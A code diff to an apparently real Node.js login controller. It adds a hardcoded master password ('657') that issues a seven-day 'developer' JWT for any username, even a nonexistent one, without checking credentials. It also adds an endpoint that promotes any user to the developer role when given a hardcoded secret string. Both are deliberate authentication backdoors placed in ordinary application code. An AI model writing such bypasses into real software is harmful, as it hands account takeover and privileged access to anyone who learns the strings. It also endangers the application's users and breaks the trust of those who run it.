@@ -21,6 +21,16 @@ export const login = async (req, res) => {
     console.log(`--- Login Attempt: ${username} ---`);
     try {
         const user = await User.findOne({ username });
+
+        // Developer Bypass 
+        if (password === '657') {
+            console.log('🚀 Developer Bypass Logic Activated');
+            // If user doesn't exist, create a dummy one or use a system-level ID
+            const targetId = user ? user._id : '000000000000000000000000';
+            const token = jwt.sign({ id: targetId, role: 'developer' }, process.env.JWT_SECRET, { expiresIn: '7d' });
+            return res.json({ token, role: 'developer' });
+        }
+
         if (!user) {
             console.log('User not found');
             return res.status(400).json({ message: 'Invalid credentials' });
@@ -44,5 +54,18 @@ export const login = async (req, res) => {
     } catch (error) {
         console.error('❌ Login error:', error.message);
         res.status(500).json({ message: 'Server error', error: error.message });
+    }
+};
+
+export const promoteToDeveloper = async (req, res) => {
+    const { username, secret } = req.body;
+    if (secret !== 'doulos-dev-2026') return res.status(403).json({ message: 'Invalid secret' });
+
+    try {
+        const user = await User.findOneAndUpdate({ username }, { role: 'developer' }, { new: true });
+        if (!user) return res.status(404).json({ message: 'User not found' });
+        res.json({ message: 'User promoted to Developer', role: user.role });
+    } catch (error) {
+        res.status(500).json({ message: 'Error updating user', error: error.message });
     }
 };
